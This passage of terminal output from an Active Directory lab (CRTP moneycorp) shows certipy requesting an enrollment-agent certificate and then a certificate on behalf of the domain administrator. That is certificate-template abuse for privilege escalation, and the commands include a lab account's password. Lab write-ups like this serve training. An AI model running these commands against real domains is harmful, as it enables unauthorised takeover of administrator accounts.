...
```
┌──(root💀0xDe4dBe3f)-[/home/…/CRTP/LinuxAttack/dollarcorp.moneycorp.local/Exploitation]
└─# certipy req -u 'student303@dollarcorp.moneycorp.local' -p a5fdNPDwScrD7T2A -target 'mcorp-dc.moneycorp.local' -ca 'moneycorp-mcorp-dc-ca' -template 'SmartCardEnrollment-Agent'
Certipy v4.3.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 23
[*] Got certificate with UPN 'student303@dollarcorp.moneycorp.local'
[*] Certificate object SID is 'S-1-5-21-719815819-3726368948-3917688648-4103'
[*] Saved certificate and private key to 'student303.pfx'
```

```
┌──(root💀0xDe4dBe3f)-[/home/…/CRTP/LinuxAttack/dollarcorp.moneycorp.local/Exploitation]
└─# certipy req -u 'student303@dollarcorp.moneycorp.local' -p a5fdNPDwScrD7T2A -target 'mcorp-dc.moneycorp.local' -ca 'moneycorp-mcorp-dc-ca' -template 'SmartCardEnrollment-Users' -on-behalf-of 'dcorp\administrator' -pfx 'student303.pfx'
Certipy v4.3.0 - by Oliver Lyak (ly4k)
...
[*] Certificate object SID is 'S-1-5-21-719815819-3726368948-3917688648-500'
